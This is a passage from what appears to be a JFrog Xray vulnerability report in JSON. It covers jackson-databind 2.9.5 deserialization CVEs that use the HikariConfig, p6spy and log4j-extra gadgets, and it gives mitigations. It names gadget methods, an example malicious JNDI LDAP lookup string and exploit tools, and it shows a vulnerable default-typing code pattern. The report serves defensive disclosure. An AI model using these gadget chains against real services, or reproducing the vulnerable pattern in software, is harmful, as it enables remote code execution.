          "remediation": "##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Deployment mitigations\n\nRemove `mysql-connector-java` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-14540",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10. It is related to com.zaxxer.hikari.HikariConfig.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-88211",
        "references": [
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/73c1c2cc76e6cdd7f3a5615cbe3207fe96e4d3db",
          "https://lists.apache.org/thread.html/ad0d238e97a7da5eca47a014f0f7e81f440ed6bf74a93183825e18b9%40%3Cissues.hbase.apache.org%3E",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b@%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/ad0d238e97a7da5eca47a014f0f7e81f440ed6bf74a93183825e18b9@%3Cissues.hbase.apache.org%3E",
          "https://seclists.org/bugtraq/2019/Oct/6",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/Q7CANA7KV53JROZDX5Z5P26UG5VN2K43/",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3@%3Ccommits.nifi.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2020:0164",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://access.redhat.com/errata/RHSA-2020:0159",
          "https://access.redhat.com/errata/RHSA-2020:0160",
          "https://lists.apache.org/thread.html/e90c3feb21702e68a8c08afce37045adb3870f2bf8223fa403fb93fb%40%3Ccommits.hbase.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/blob/master/release-notes/VERSION-2.x",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TH5VFUN4P7CCIP7KSEXYA5MUTFCUDUJT",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TH5VFUN4P7CCIP7KSEXYA5MUTFCUDUJT/",
          "https://access.redhat.com/errata/RHSA-2020:0445",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3%40%3Ccommits.nifi.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://lists.apache.org/thread.html/a360b46061c91c5cad789b6c3190aef9b9f223a2b75c9c9f046fe016@%3Cissues.hbase.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/issues/2410",
          "https://security.netapp.com/advisory/ntap-20191004-0002/",
          "https://lists.apache.org/thread.html/r8aaf4ee16bbaf6204731d4770d96ebb34b258cd79b491f9cdd7f2540%40%3Ccommits.nifi.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/d4983c740fec7d5576b207a8c30a63d3ea7443de",
          "https://lists.apache.org/thread.html/40c00861b53bb611dee7d6f35f864aa7d1c1bd77df28db597cbf27e1@%3Cissues.hbase.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://www.debian.org/security/2019/dsa-4542",
          "https://lists.apache.org/thread.html/dc6b5cad721a4f6b3b62ed1163894941140d9d5656140fb757505ca0@%3Cissues.hbase.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/Q7CANA7KV53JROZDX5Z5P26UG5VN2K43",
          "https://lists.apache.org/thread.html/a4f2c9fb36642a48912cdec6836ec00e497427717c5d377f8d7ccce6%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/40c00861b53bb611dee7d6f35f864aa7d1c1bd77df28db597cbf27e1%40%3Cissues.hbase.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3200",
          "https://github.com/advisories/GHSA-h822-r4r5-v8jg",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/0fcef7321095ce0bc597d468d150cff3d647f4cb3aef3bd4d20e1c69%40%3Ccommits.tinkerpop.apache.org%3E",
          "https://lists.apache.org/thread.html/a4f2c9fb36642a48912cdec6836ec00e497427717c5d377f8d7ccce6@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b%40%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/0fcef7321095ce0bc597d468d150cff3d647f4cb3aef3bd4d20e1c69@%3Ccommits.tinkerpop.apache.org%3E",
          "https://lists.apache.org/thread.html/dc6b5cad721a4f6b3b62ed1163894941140d9d5656140fb757505ca0%40%3Cissues.hbase.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2019/10/msg00001.html",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/a360b46061c91c5cad789b6c3190aef9b9f223a2b75c9c9f046fe016%40%3Cissues.hbase.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-14540",
          "https://lists.apache.org/thread.html/e90c3feb21702e68a8c08afce37045adb3870f2bf8223fa403fb93fb@%3Ccommits.hbase.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20191004-0002",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/issues/2449",
          "https://lists.apache.org/thread.html/r8aaf4ee16bbaf6204731d4770d96ebb34b258cd79b491f9cdd7f2540@%3Ccommits.nifi.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2020:0161"
        ],
        "extended_information": {
          "short_description": "A typing issue in zaxxer.hikari in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with ` com.zaxxer.hikari.HikariConfig` gadget in [zaxxer.hikari]( https://github.com/svn2github/ehcache/tree/ ), the attacker can use this class to indirectly call `getObjectOrPerformJndiLookup` by calling `setHealthCheckRegistry`.\nThe method assuming that any `healthCheckRegistry` argument is trusted and later performs JNDI loading using it. The attacker can call this function with an arbitrary argument such as `\"ldap://127.0.0.1:1088/Exploit\"` which leads to remote code execution as shown in this [PoC](https://www.programmersought.com/article/80917857170/) of an older issue by using marshalsec (see section \"Build an environment\").\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` zaxxer.hikari ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` zaxxer.hikari ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `zaxxer.hikari` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-16943",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 through 2.9.10. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the p6spy (3.8.6) jar in the classpath, and an attacker can find an RMI service endpoint to access, it is possible to make the service execute a malicious payload. This issue exists because of com.p6spy.engine.spy.P6DataSource mishandling.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.1]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-89104",
        "references": [
          "https://github.com/advisories/GHSA-fmmc-742q-jg75",
          "https://access.redhat.com/errata/RHSA-2020:0161",
          "https://access.redhat.com/errata/RHSA-2020:0160",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://www.debian.org/security/2019/dsa-4542",
          "https://lists.apache.org/thread.html/5ec8d8d485c2c8ac55ea425f4cd96596ef37312532712639712ebcdd@%3Ccommits.iceberg.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/FasterXML/jackson-databind/issues/2478",
          "https://lists.apache.org/thread.html/5ec8d8d485c2c8ac55ea425f4cd96596ef37312532712639712ebcdd%40%3Ccommits.iceberg.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/bc67eb11a7cf57561f861ff16f879f1fceb5779f",
          "https://security.netapp.com/advisory/ntap-20191017-0006/",
          "https://lists.apache.org/thread.html/6788e4c991f75b89d290ad06b463fcd30bcae99fee610345a35b7bc6%40%3Cissues.iceberg.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2019/10/msg00001.html",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r392099ed2757ff2e383b10440594e914d080511d7da1c8fed0612c1f%40%3Ccommits.druid.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-16943",
          "https://seclists.org/bugtraq/2019/Oct/6",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TH5VFUN4P7CCIP7KSEXYA5MUTFCUDUJT/",
          "https://github.com/FasterXML/jackson-databind/commit/328a0f833daf6baa443ac3b37c818a0204714b0b",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/6788e4c991f75b89d290ad06b463fcd30bcae99fee610345a35b7bc6@%3Cissues.iceberg.apache.org%3E",
          "https://lists.apache.org/thread.html/r392099ed2757ff2e383b10440594e914d080511d7da1c8fed0612c1f@%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2020:0164",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/Q7CANA7KV53JROZDX5Z5P26UG5VN2K43/",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://access.redhat.com/errata/RHSA-2020:0159",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/Q7CANA7KV53JROZDX5Z5P26UG5VN2K43/",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TH5VFUN4P7CCIP7KSEXYA5MUTFCUDUJT/",
          "https://access.redhat.com/errata/RHSA-2020:0445"
        ],
        "extended_information": {
          "short_description": "A typing issue in p6spy in Jackson-databind allows an attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [p6spy](https://github.com/p6spy/p6spy) gadget, an attacker can create an arbitrary JDBC connection by invoking the `com.p6spy.engine.spy.P6DataSource` method, which allows for arbitrary SQL execution through the JDBC connection which further allows code injection, since the H2 JDBC driver allows defining and executing custom SQL aliases containing Java code. Additional information on this gadget can be found [here](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html).\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes p6spy in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `p6spy` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `p6spy` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-17531",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 through 2.9.10. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the apache-log4j-extra (version 1.2.x) jar in the classpath, and an attacker can provide a JNDI service to access, it is possible to make the service execute a malicious payload.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.1]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-89945",
        "references": [
          "https://github.com/advisories/GHSA-gjmw-vf9h-g25v",
          "https://access.redhat.com/errata/RHSA-2020:0164",
          "https://github.com/FasterXML/jackson-databind/issues/2498",
          "https://lists.debian.org/debian-lts-announce/2019/12/msg00013.html",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.apache.org/thread.html/b3c90d38f99db546de60fea65f99a924d540fae2285f014b79606ca5%40%3Ccommits.pulsar.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2020:0445",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20191024-0005/",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://access.redhat.com/errata/RHSA-2020:0161",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r392099ed2757ff2e383b10440594e914d080511d7da1c8fed0612c1f%40%3Ccommits.druid.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://access.redhat.com/errata/RHSA-2020:0159",
          "https://github.com/FasterXML/jackson-databind/commit/b5a304a98590b6bb766134f9261e6566dcbbb6d0",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://access.redhat.com/errata/RHSA-2019:4192",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://lists.apache.org/thread.html/r392099ed2757ff2e383b10440594e914d080511d7da1c8fed0612c1f@%3Ccommits.druid.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-17531",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/b3c90d38f99db546de60fea65f99a924d540fae2285f014b79606ca5@%3Ccommits.pulsar.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2020:0160"
        ],
        "extended_information": {
          "short_description": "A typing issue in apache-log4j-extra in Jackson-databind allows a remote attacker to perform code injection.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [apache-log4j-extra]( https://github.com/apache/log4j) gadget, an attacker can create an arbitrary JNDI connection by invoking ` lookupDataSource` or ` setJndiLocation` , which allows for accessing a JNDI location with the servers privileges\nwhich further allows code injection and then code execution. Additional information on exploitation of a similar gadget can be found [here](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html).\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes apache-log4j-extra in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes apache-log4j-extra in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `apache-log4j-extra` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-36180",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
